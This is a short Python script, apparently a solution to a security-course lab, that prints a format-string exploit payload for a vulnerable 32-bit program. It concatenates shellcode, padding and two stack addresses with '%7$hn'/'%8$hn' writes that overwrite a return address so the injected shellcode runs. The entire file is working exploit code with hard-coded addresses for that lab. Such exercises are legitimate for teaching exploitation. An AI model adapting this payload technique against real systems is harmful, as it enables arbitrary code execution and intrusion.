#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# call printf instruction: 0x080488da
# vulnerable ebp: 0xfffe9fcc
# buf starts at 0xfffe97cc

# 0xfffe = 65534, 0x97cc = 38860
padding = 1
add1 = pack('<I', 0xfffe9fd0) 
add2 = pack('<I', 0xfffe9fd2) 

# first %n: 38860-23-padding-4-4 = a, second %n: 65534-first
sys.stdout.buffer.write(shellcode + b'\x90'*padding + add1 + add2 + b'%38828x%7$hn%26674x%8$hn')

